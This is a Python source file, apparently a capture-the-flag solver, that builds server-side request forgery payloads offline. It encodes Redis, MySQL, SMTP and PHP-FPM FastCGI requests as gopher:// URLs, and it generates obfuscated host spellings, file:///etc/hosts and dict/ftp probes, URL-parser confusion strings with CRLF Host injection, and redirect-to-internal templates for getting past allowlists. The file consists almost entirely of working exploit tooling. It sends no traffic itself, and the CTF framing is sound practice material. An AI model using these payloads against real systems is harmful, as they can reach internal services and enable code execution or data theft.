#!/usr/bin/env python3
"""Build SSRF protocol and URL-parser candidates without sending requests.

The functions in this module turn facts supplied by a player into byte-exact
``gopher://`` selectors and URL spelling candidates.  They never resolve a
hostname, open a socket, follow a redirect, or contact a target.  Generated
values are intended for one reviewed replay through the repository's existing
scope-locked web client.

Supported protocol payloads are Redis RESP commands, a MySQL COM_QUERY packet,
an SMTP transaction, and FastCGI/FPM request records.  The MySQL packet starts
*after* authentication; it is useful only where the challenge has already
provided an authenticated/proxy context.  All inputs and generated payloads
are bounded.

CLI examples (all offline)::

    .venv/bin/python solvers/web/ssrf_chains.py host 127.0.0.1 --json
    .venv/bin/python solvers/web/ssrf_chains.py redis 127.0.0.1 \
        --command SET marker CSCTF_REDIS_MARKER --json
    .venv/bin/python solvers/web/ssrf_chains.py fastcgi 127.0.0.1 \
        --script /var/www/html/index.php --query 'a=marker' --json
    .venv/bin/python solvers/web/ssrf_chains.py confusion \
        http://127.0.0.1/admin --public https://allowed.example/ --json
"""

from __future__ import annotations

import argparse
import base64
import ipaddress
import json
import re
import struct
import sys
import urllib.parse
from typing import Any, Iterable, Sequence


MAX_TEXT = 4096
MAX_PAYLOAD = 256 * 1024
MAX_COMMANDS = 64
MAX_PARTS = 128
MAX_PARAMS = 128


class SSRFInputError(ValueError):
    """Raised when an offline builder input is malformed or exceeds a cap."""


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover - exercised through main
        raise SSRFInputError(message)


def _text(value: Any, label: str, *, maximum: int = MAX_TEXT,
          allow_empty: bool = False) -> str:
    if not isinstance(value, str):
        raise SSRFInputError(f"{label} must be text")
    if not value and not allow_empty:
        raise SSRFInputError(f"{label} must not be empty")
    if len(value) > maximum:
        raise SSRFInputError(f"{label} exceeds {maximum} characters")
    if "\x00" in value:
        raise SSRFInputError(f"{label} must not contain NUL")
    return value


def _bytes(value: str | bytes | bytearray, label: str,
           *, maximum: int = MAX_PAYLOAD) -> bytes:
    if isinstance(value, str):
        try:
            data = value.encode("utf-8")
        except UnicodeError as exc:
            raise SSRFInputError(f"{label} must be UTF-8 encodable text") from exc
    elif isinstance(value, (bytes, bytearray)):
        data = bytes(value)
    else:
        raise SSRFInputError(f"{label} must be text or bytes")
    if len(data) > maximum:
        raise SSRFInputError(f"{label} exceeds {maximum} bytes")
    return data


def _port(value: Any) -> int:
    try:
        port = int(value)
    except (TypeError, ValueError) as exc:
        raise SSRFInputError("port must be an integer") from exc
    if not 1 <= port <= 65535:
        raise SSRFInputError("port must be between 1 and 65535")
    return port


def _host(value: str) -> str:
    host = _text(value, "host", maximum=253)
    if host.startswith("[") and host.endswith("]"):
        host = host[1:-1]
    if any(ord(ch) < 33 or ch in "/?#@" for ch in host):
        raise SSRFInputError("host contains a control, whitespace, or URL delimiter")
    if not host:
        raise SSRFInputError("host must not be empty")
    return host


def _authority_host(host: str) -> str:
    host = _host(host)
    try:
        parsed = ipaddress.ip_address(host)
    except ValueError:
        return host
    return f"[{host}]" if parsed.version == 6 else host


def _row(rank: int, family: str, name: str, value: str, *,
         requirement: str, note: str = "") -> dict[str, Any]:
    return {
        "rank": rank,
        "family": family,
        "name": name,
        "value": value,
        "requirement": requirement,
        "note": note or "candidate only; parser behavior must be confirmed from real challenge output",
        "offline": True,
        "network_requests": 0,
    }


def host_encoding_table(host: str) -> list[dict[str, Any]]:
    """Return alternate textual host spellings for parser-comparison work.

    Numeric encodings are emitted only for IPv4 input.  ``0.0.0.0`` is listed
    for loopback addresses because some challenge services translate it to the
    local listener; the descriptor does not claim that every stack does so.
    """

    original = _host(host)
    try:
        address = ipaddress.ip_address(original)
    except ValueError:
        rows = [
            _row(1, "host", "canonical", original,
                 requirement="the backend accepts a DNS hostname"),
            _row(2, "host", "trailing_dot", original.rstrip(".") + ".",
                 requirement="a filter and resolver disagree about the DNS root dot"),
        ]
        return rows

    if address.version == 6:
        canonical = address.compressed
        return [
            _row(1, "host", "ipv6_bracketed", f"[{canonical}]",
                 requirement="the URL parser accepts IPv6 literals"),
            _row(2, "host", "ipv6_expanded", f"[{address.exploded}]",
                 requirement="the filter compares textual rather than normalized IPv6"),
        ]

    octets = [int(part) for part in str(address).split(".")]
    integer = int(address)
    circled = "".join(
        "." if ch == "." else (chr(0x2460 + int(ch) - 1) if ch != "0" else "\u24ea")
        for ch in str(address)
    )
    values: list[tuple[str, str, str]] = [
        ("canonical", str(address), "ordinary dotted-decimal IPv4 is accepted"),
        ("single_decimal", str(integer), "the URL stack accepts a 32-bit decimal IPv4 integer"),
        ("single_hex", f"0x{integer:08x}", "the URL stack accepts a hexadecimal IPv4 integer"),
        ("single_octal", f"0{integer:o}", "the URL stack accepts a legacy octal IPv4 integer"),
        ("dotted_hex", ".".join(f"0x{x:x}" for x in octets),
         "the resolver accepts hexadecimal dotted components"),
        ("dotted_octal", ".".join(f"0{x:o}" for x in octets),
         "the resolver accepts legacy octal dotted components"),
        ("ipv6_mapped", f"[::ffff:{address}]",
         "an IPv6-mapped spelling reaches the IPv4 listener"),
        ("enclosed_alnum", circled,
         "Unicode compatibility normalization occurs after the allow/deny comparison"),
        ("trailing_dot", f"{address}.",
         "the parser tolerates a root dot after an address literal"),
    ]
    if address.is_loopback:
        values.append(("unspecified", "0.0.0.0",
                       "the target service treats an unspecified destination as its local listener"))
    return [_row(index, "host", name, value, requirement=req)
            for index, (name, value, req) in enumerate(values, 1)]


def gopher_url(host: str, port: int, payload: str | bytes | bytearray) -> dict[str, Any]:
    """Encode raw protocol bytes as a gopher selector descriptor."""

    authority = _authority_host(host)
    port = _port(port)
    raw = _bytes(payload, "payload")
    encoded = urllib.parse.quote_from_bytes(raw, safe="")
    url = f"gopher://{authority}:{port}/_{encoded}"
    if len(url) > MAX_PAYLOAD * 3 + MAX_TEXT:
        raise SSRFInputError("encoded gopher URL exceeds the output cap")
    return {
        "url": url,
        "payload_base64": base64.b64encode(raw).decode("ascii"),
        "payload_length": len(raw),
        "sha256_hint": "hash externally if provenance requires it",
        "offline": True,
        "network_requests": 0,
    }


def redis_resp_command(parts: Sequence[str | bytes | bytearray]) -> bytes:
    """Encode one Redis command using RESP2 bulk strings."""

    if isinstance(parts, (str, bytes, bytearray)):
        raise SSRFInputError("Redis command must be a sequence of arguments")
    try:
        bounded = list(parts)
    except TypeError as exc:
        raise SSRFInputError("Redis command must be an iterable of arguments") from exc
    if not 1 <= len(bounded) <= MAX_PARTS:
        raise SSRFInputError(f"Redis command must have 1..{MAX_PARTS} arguments")
    chunks = [f"*{len(bounded)}\r\n".encode("ascii")]
    total = len(chunks[0])
    for part in bounded:
        data = _bytes(part, "Redis argument", maximum=64 * 1024)
        total += len(data) + 32
        if total > MAX_PAYLOAD:
            raise SSRFInputError("Redis request exceeds the payload cap")
        chunks.extend((f"${len(data)}\r\n".encode("ascii"), data, b"\r\n"))
    return b"".join(chunks)


def build_redis_gopher(host: str, commands: Iterable[Sequence[str | bytes | bytearray]],
                       *, port: int = 6379) -> dict[str, Any]:
    """Build a bounded sequence of RESP commands and its gopher URL."""

    if isinstance(commands, (str, bytes, bytearray)):
        raise SSRFInputError("Redis commands must be a sequence of commands, not text/bytes")
    try:
        iterator = enumerate(commands)
    except TypeError as exc:
        raise SSRFInputError("Redis commands must be an iterable of commands") from exc
    command_list = []
    for index, command in iterator:
        if index >= MAX_COMMANDS:
            raise SSRFInputError(f"Redis command count exceeds {MAX_COMMANDS}")
        command_list.append(command)
    if not command_list:
        raise SSRFInputError("at least one Redis command is required")
    raw = b"".join(redis_resp_command(command) for command in command_list)
    if len(raw) > MAX_PAYLOAD:
        raise SSRFInputError("Redis request exceeds the payload cap")
    out = gopher_url(host, port, raw)
    out.update({
        "protocol": "redis-resp2",
        "command_count": len(command_list),
        "requirement": "the supplied URL reaches a Redis listener and the listed commands are permitted",
    })
    return out


def mysql_com_query_packet(query: str | bytes | bytearray, *, sequence_id: int = 0) -> bytes:
    """Return a single MySQL COM_QUERY packet (not a login handshake)."""

    data = _bytes(query, "query", maximum=min(MAX_PAYLOAD - 5, 0xFFFFFF - 1))
    try:
        sequence_id = int(sequence_id)
    except (TypeError, ValueError) as exc:
        raise SSRFInputError("sequence_id must be an integer") from exc
    if not 0 <= sequence_id <= 255:
        raise SSRFInputError("sequence_id must be between 0 and 255")
    body = b"\x03" + data
    header = len(body).to_bytes(3, "little") + bytes((sequence_id,))
    return header + body


def build_mysql_gopher(host: str, query: str | bytes | bytearray, *,
                       port: int = 3306, sequence_id: int = 0) -> dict[str, Any]:
    packet = mysql_com_query_packet(query, sequence_id=sequence_id)
    out = gopher_url(host, port, packet)
    out.update({
        "protocol": "mysql-com-query",
        "requirement": (
            "the stream is already authenticated or a challenge proxy accepts a COM_QUERY packet; "
            "this builder does not synthesize MySQL authentication"
        ),
    })
    return out


_SMTP_ADDRESS = re.compile(r"^[^\s<>@]+@[^\s<>@]+$")


def _smtp_address(value: str, label: str) -> str:
    value = _text(value, label, maximum=320)
    if "\r" in value or "\n" in value or not _SMTP_ADDRESS.fullmatch(value):
        raise SSRFInputError(f"{label} must be one mailbox without CR/LF")
    return value


def smtp_transaction(mail_from: str, rcpt_to: str, body: str | bytes | bytearray,
                     *, helo: str = "ctf.local") -> bytes:
    """Build one dot-stuffed SMTP DATA transaction."""

    sender = _smtp_address(mail_from, "mail_from")
    recipient = _smtp_address(rcpt_to, "rcpt_to")
    helo = _text(helo, "helo", maximum=253)
    if any(ch in helo for ch in "\r\n "):
        raise SSRFInputError("helo must contain no CR, LF, or spaces")
    data = _bytes(body, "body", maximum=128 * 1024)
    # Normalize all common line endings before RFC 5321 dot-stuffing.
    lines = data.replace(b"\r\n", b"\n").replace(b"\r", b"\n").split(b"\n")
    stuffed = b"\r\n".join((b"." + line) if line.startswith(b".") else line for line in lines)
    return (f"EHLO {helo}\r\nMAIL FROM:<{sender}>\r\nRCPT TO:<{recipient}>\r\nDATA\r\n".encode("ascii")
            + stuffed + b"\r\n.\r\nQUIT\r\n")


def build_smtp_gopher(host: str, mail_from: str, rcpt_to: str,
                      body: str | bytes | bytearray, *, port: int = 25,
                      helo: str = "ctf.local") -> dict[str, Any]:
    raw = smtp_transaction(mail_from, rcpt_to, body, helo=helo)
    out = gopher_url(host, port, raw)
    out.update({
        "protocol": "smtp",
        "requirement": "the assigned service permits the supplied sender, recipient, and DATA transaction",
    })
    return out


FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5


def _fcgi_record(record_type: int, content: bytes, request_id: int = 1) -> bytes:
    if len(content) > 65535:
        raise SSRFInputError("one FastCGI record exceeds 65535 content bytes")
    if not 1 <= request_id <= 65535:
        raise SSRFInputError("FastCGI request_id must be between 1 and 65535")
    padding = (-len(content)) % 8
    header = struct.pack("!BBHHBB", 1, record_type, request_id, len(content), padding, 0)
    return header + content + b"\x00" * padding


def _fcgi_length(length: int) -> bytes:
    if length < 0 or length > 0x7FFFFFFF:
        raise SSRFInputError("FastCGI name/value field exceeds its format limit")
    return bytes((length,)) if length < 128 else struct.pack("!I", length | 0x80000000)


def _fcgi_pair(name: str, value: str) -> bytes:
    try:
        name_b = _text(name, "FastCGI parameter name", maximum=1024).encode("utf-8")
        value_b = _text(value, f"FastCGI value for {name}", maximum=64 * 1024,
                        allow_empty=True).encode("utf-8")
    except UnicodeError as exc:
        raise SSRFInputError("FastCGI name/value must be UTF-8 encodable text") from exc
    return _fcgi_length(len(name_b)) + _fcgi_length(len(value_b)) + name_b + value_b


def fastcgi_request(script_filename: str, *, query_string: str = "",
                    method: str = "GET", stdin: str | bytes | bytearray = b"",
                    extra_params: dict[str, str] | None = None,
                    request_id: int = 1) -> bytes:
    """Build a complete FastCGI responder request for PHP-FPM."""

    script = _text(script_filename, "script_filename", maximum=4096)
    method = _text(method, "method", maximum=16).upper()
    if not re.fullmatch(r"[A-Z]+", method):
        raise SSRFInputError("method must contain uppercase ASCII letters only")
    query = _text(query_string, "query_string", maximum=8192, allow_empty=True)
    body = _bytes(stdin, "stdin", maximum=128 * 1024)
    params: dict[str, str] = {
        "GATEWAY_INTERFACE": "CGI/1.1",
        "REQUEST_METHOD": method,
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": script,
        "QUERY_STRING": query,
        "REQUEST_URI": script + (("?" + query) if query else ""),
        "SERVER_PROTOCOL": "HTTP/1.1",
        "CONTENT_LENGTH": str(len(body)),
    }
    if extra_params:
        if len(extra_params) > MAX_PARAMS:
            raise SSRFInputError(f"extra FastCGI parameters exceed {MAX_PARAMS}")
        for key, value in extra_params.items():
            key = _text(key, "FastCGI parameter name", maximum=1024)
            if not re.fullmatch(r"[A-Z][A-Z0-9_]*", key):
                raise SSRFInputError(f"invalid FastCGI parameter name {key!r}")
            params[key] = _text(value, f"FastCGI value for {key}", maximum=64 * 1024,
                                allow_empty=True)
    if len(params) > MAX_PARAMS:
        raise SSRFInputError(f"FastCGI parameter count exceeds {MAX_PARAMS}")
    param_blob = b"".join(_fcgi_pair(key, value) for key, value in params.items())
    if len(param_blob) > 65535:
        raise SSRFInputError("encoded FastCGI parameters exceed one bounded record")
    begin = struct.pack("!HB5s", 1, 0, b"\x00" * 5)  # FCGI_RESPONDER, no keep-conn
    raw = (_fcgi_record(FCGI_BEGIN_REQUEST, begin, request_id)
           + _fcgi_record(FCGI_PARAMS, param_blob, request_id)
           + _fcgi_record(FCGI_PARAMS, b"", request_id)
           + _fcgi_record(FCGI_STDIN, body, request_id)
           + _fcgi_record(FCGI_STDIN, b"", request_id))
    if len(raw) > MAX_PAYLOAD:
        raise SSRFInputError("FastCGI request exceeds the payload cap")
    return raw


def build_fastcgi_gopher(host: str, script_filename: str, *, port: int = 9000,
                         query_string: str = "", method: str = "GET",
                         stdin: str | bytes | bytearray = b"",
                         extra_params: dict[str, str] | None = None) -> dict[str, Any]:
    raw = fastcgi_request(script_filename, query_string=query_string, method=method,
                          stdin=stdin, extra_params=extra_params)
    out = gopher_url(host, port, raw)
    out.update({
        "protocol": "fastcgi-fpm",
        "requirement": "the URL reaches the intended FPM listener and SCRIPT_FILENAME exists there",
    })
    return out


def scheme_probe_candidates(host: str = "127.0.0.1", *, port: int = 80,
                            path: str = "/") -> list[dict[str, Any]]:
    """Return non-HTTP scheme spellings only; no URL is opened."""

    authority = _authority_host(host)
    port = _port(port)
    path = _text(path, "path", maximum=2048)
    if not path.startswith("/"):
        path = "/" + path
    quoted_path = urllib.parse.quote(path, safe="/%:@")
    rows = [
        ("file_local", "file:///etc/hosts", "the fetcher implements local file URLs"),
        ("dict_banner", f"dict://{authority}:{port}/show:CSCTF_SSRF_MARKER",
         "the fetcher implements DICT and the destination speaks a useful text protocol"),
        ("ftp_path", f"ftp://{authority}:{port}{quoted_path}",
         "the fetcher implements FTP and the destination accepts the resulting commands"),
        ("gopher_marker", f"gopher://{authority}:{port}/_CSCTF_SSRF_MARKER%0d%0a",
         "the fetcher implements gopher selectors"),
    ]
    return [_row(index, "scheme", name, value, requirement=req)
            for index, (name, value, req) in enumerate(rows, 1)]


def _absolute_url(value: str, label: str) -> urllib.parse.SplitResult:
    value = _text(value, label)
    if any(ord(ch) < 32 or ord(ch) == 127 for ch in value):
        raise SSRFInputError(f"{label} must contain no raw control characters")
    try:
        parsed = urllib.parse.urlsplit(value)
        # Accessing port validates malformed/non-numeric values.
        _ = parsed.port
    except ValueError as exc:
        raise SSRFInputError(f"{label} is not a valid bounded absolute URL: {exc}") from exc
    if parsed.scheme.lower() not in {"http", "https"} or not parsed.hostname:
        raise SSRFInputError(f"{label} must be an absolute http(s) URL")
    if parsed.username or parsed.password:
        raise SSRFInputError(f"{label} must not already contain credentials")
    return parsed


def _netloc(parsed: urllib.parse.SplitResult) -> str:
    host = parsed.hostname or ""
    rendered = f"[{host}]" if ":" in host and not host.startswith("[") else host
    return rendered + ((f":{parsed.port}") if parsed.port is not None else "")


def url_parser_confusion_candidates(internal_url: str, *,
                                    public_url: str = "https://allowed.example/") -> list[dict[str, Any]]:
    """Build bounded URL-authority ambiguity candidates.

    Rows deliberately include both directions of a parser disagreement.  The
    ``requirement`` field states what must be true; a candidate is never
    labelled as a confirmed bypass.
    """

    internal = _absolute_url(internal_url, "internal_url")
    public = _absolute_url(public_url, "public_url")
    i_authority, p_authority = _netloc(internal), _netloc(public)
    suffix = urllib.parse.urlunsplit(("", "", internal.path or "/", internal.query, ""))
    scheme = internal.scheme
    rows = [
        ("userinfo_at", f"{scheme}://{p_authority}@{i_authority}{suffix}",
         "the validator treats the text before @ as the host while the fetcher uses the authority after @"),
        ("reverse_userinfo", f"{scheme}://{i_authority}@{p_authority}{suffix}",
         "the validator and fetcher choose opposite sides of userinfo"),
        ("credentials", f"{scheme}://user:pass@{i_authority}{suffix}",
         "credential stripping occurs after host validation"),
        ("encoded_at", f"{scheme}://{p_authority}%40{i_authority}{suffix}",
         "percent-decoding occurs in only one of the URL parser layers"),
        ("fragment_at", f"{scheme}://{p_authority}#@{i_authority}{suffix}",
         "a non-standard parser treats fragment text as authority input"),
        ("comma_authority", f"{scheme}://{p_authority},{i_authority}{suffix}",
         "proxy and application split a comma-containing authority differently"),
        ("backslash_at", f"{scheme}://{p_authority}\\@{i_authority}{suffix}",
         "WHATWG and RFC-style parsers disagree on backslash handling"),
        ("tab_before_at", f"{scheme}://{p_authority}%09@{i_authority}{suffix}",
         "one parser removes encoded ASCII whitespace before authority parsing"),
        ("space_before_at", f"{scheme}://{p_authority}%20@{i_authority}{suffix}",
         "one parser trims or decodes authority whitespace"),
        ("crlf_authority", f"{scheme}://{p_authority}%0d%0aHost:%20{i_authority}{suffix}",
         "a vulnerable intermediary decodes CRLF into a replacement Host header"),
        ("double_encoded_at", f"{scheme}://{p_authority}%2540{i_authority}{suffix}",
         "two URL-decode layers disagree with a one-pass validator"),
    ]
    internal_dot_host = internal.hostname or ""
    if ":" not in internal_dot_host:
        # A DNS root dot is meaningful for names and remains a useful parser
        # comparison for legacy IPv4 URL parsers.  Keep the port outside it.
        internal_dot_authority = internal_dot_host.rstrip(".") + "."
        if internal.port is not None:
            internal_dot_authority += f":{internal.port}"
        rows.append(("trailing_dot_internal", f"{scheme}://{internal_dot_authority}{suffix}",
                     "host comparison occurs before DNS root-dot normalization"))
    return [_row(index, "parser-confusion", name, value, requirement=req)
            for index, (name, value, req) in enumerate(rows, 1)]


def redirect_to_internal(redirector_url: str, internal_url: str, *,
                         parameter: str = "url", status: int = 302) -> dict[str, Any]:
    """Describe a redirect URL and inert response template; start no server."""

    redirector = _absolute_url(redirector_url, "redirector_url")
    internal = _absolute_url(internal_url, "internal_url")
    parameter = _text(parameter, "parameter", maximum=128)
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]*", parameter):
        raise SSRFInputError("parameter must be a simple query-key name")
    try:
        status = int(status)
    except (TypeError, ValueError) as exc:
        raise SSRFInputError("status must be an integer") from exc
    if status not in {301, 302, 303, 307, 308}:
        raise SSRFInputError("status must be one of 301, 302, 303, 307, 308")
    query = urllib.parse.parse_qsl(redirector.query, keep_blank_values=True)
    query.append((parameter, internal.geturl()))
    generated = urllib.parse.urlunsplit((redirector.scheme, redirector.netloc, redirector.path or "/",
                                        urllib.parse.urlencode(query), redirector.fragment))
    return {
        "url": generated,
        "redirect_response_template": (
            f"HTTP/1.1 {status} Redirect\r\n"
            f"Location: {internal.geturl()}\r\nContent-Length: 0\r\n\r\n"
        ),
        "status": status,
        "requirement": "the assigned fetcher follows redirects and re-validates neither destination nor scheme",
        "offline": True,
        "server_started": False,
        "network_requests": 0,
    }


def _parser() -> argparse.ArgumentParser:
    parser = _Parser(description="Offline SSRF protocol and URL-parser candidate builder")
    sub = parser.add_subparsers(dest="cmd", required=True, parser_class=_Parser)

    host = sub.add_parser("host", help="list alternate host spellings")
    host.add_argument("host")
    host.add_argument("--json", action="store_true")

    redis = sub.add_parser("redis", help="build Redis RESP gopher selector")
    redis.add_argument("host")
    redis.add_argument("--port", type=int, default=6379)
    redis.add_argument("--command", nargs="+", action="append", required=True,
                       help="one command and arguments; repeat for multiple commands")
    redis.add_argument("--json", action="store_true")

    mysql = sub.add_parser("mysql", help="build a post-authentication MySQL COM_QUERY selector")
    mysql.add_argument("host")
    mysql.add_argument("--port", type=int, default=3306)
    mysql.add_argument("--query", required=True)
    mysql.add_argument("--sequence-id", type=int, default=0)
    mysql.add_argument("--json", action="store_true")

    smtp = sub.add_parser("smtp", help="build one SMTP transaction selector")
    smtp.add_argument("host")
    smtp.add_argument("--port", type=int, default=25)
    smtp.add_argument("--from", dest="mail_from", required=True)
    smtp.add_argument("--to", dest="rcpt_to", required=True)
    smtp.add_argument("--body", required=True)
    smtp.add_argument("--helo", default="ctf.local")
    smtp.add_argument("--json", action="store_true")

    fcgi = sub.add_parser("fastcgi", help="build a FastCGI/FPM selector")
    fcgi.add_argument("host")
    fcgi.add_argument("--port", type=int, default=9000)
    fcgi.add_argument("--script", required=True)
    fcgi.add_argument("--query", default="")
    fcgi.add_argument("--method", default="GET")
    fcgi.add_argument("--data", default="")
    fcgi.add_argument("--param", action="append", default=[], metavar="NAME=VALUE")
    fcgi.add_argument("--json", action="store_true")

    probes = sub.add_parser("probes", help="list file/dict/ftp/gopher spellings")
    probes.add_argument("host", nargs="?", default="127.0.0.1")
    probes.add_argument("--port", type=int, default=80)
    probes.add_argument("--path", default="/")
    probes.add_argument("--json", action="store_true")

    confusion = sub.add_parser("confusion", help="build parser-confusion URL spellings")
    confusion.add_argument("internal_url")
    confusion.add_argument("--public", default="https://allowed.example/")
    confusion.add_argument("--json", action="store_true")

    redirect = sub.add_parser("redirect", help="describe a redirect-to-internal candidate")
    redirect.add_argument("redirector_url")
    redirect.add_argument("internal_url")
    redirect.add_argument("--parameter", default="url")
    redirect.add_argument("--status", type=int, default=302)
    redirect.add_argument("--json", action="store_true")
    return parser


def _params(values: Sequence[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    if len(values) > MAX_PARAMS:
        raise SSRFInputError(f"FastCGI parameters exceed {MAX_PARAMS}")
    for value in values:
        if "=" not in value:
            raise SSRFInputError("--param values must use NAME=VALUE")
        name, item = value.split("=", 1)
        if name in out:
            raise SSRFInputError(f"duplicate FastCGI parameter {name!r}")
        out[name] = item
    return out


def _print_human(result: Any) -> None:
    if isinstance(result, list):
        for row in result:
            print(f"{row['rank']}. [{row['name']}] {row['value']}")
            print(f"   requires: {row['requirement']}")
        return
    if "url" in result:
        print(result["url"])
    if "requirement" in result:
        print(f"requires: {result['requirement']}")


def main(argv: list[str] | None = None) -> int:
    try:
        args = _parser().parse_args(argv)
        if args.cmd == "host":
            result: Any = host_encoding_table(args.host)
        elif args.cmd == "redis":
            result = build_redis_gopher(args.host, args.command, port=args.port)
        elif args.cmd == "mysql":
            result = build_mysql_gopher(args.host, args.query, port=args.port,
                                         sequence_id=args.sequence_id)
        elif args.cmd == "smtp":
            result = build_smtp_gopher(args.host, args.mail_from, args.rcpt_to, args.body,
                                        port=args.port, helo=args.helo)
        elif args.cmd == "fastcgi":
            result = build_fastcgi_gopher(args.host, args.script, port=args.port,
                                           query_string=args.query, method=args.method,
                                           stdin=args.data, extra_params=_params(args.param))
        elif args.cmd == "probes":
            result = scheme_probe_candidates(args.host, port=args.port, path=args.path)
        elif args.cmd == "confusion":
            result = url_parser_confusion_candidates(args.internal_url, public_url=args.public)
        else:
            result = redirect_to_internal(args.redirector_url, args.internal_url,
                                          parameter=args.parameter, status=args.status)
    except (SSRFInputError, ValueError, TypeError, OverflowError) as exc:
        print(f"ssrf_chains: {exc}", file=sys.stderr)
        return 2

    if getattr(args, "json", False):
        print(json.dumps(result, indent=2, ensure_ascii=False, sort_keys=True))
    else:
        _print_human(result)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
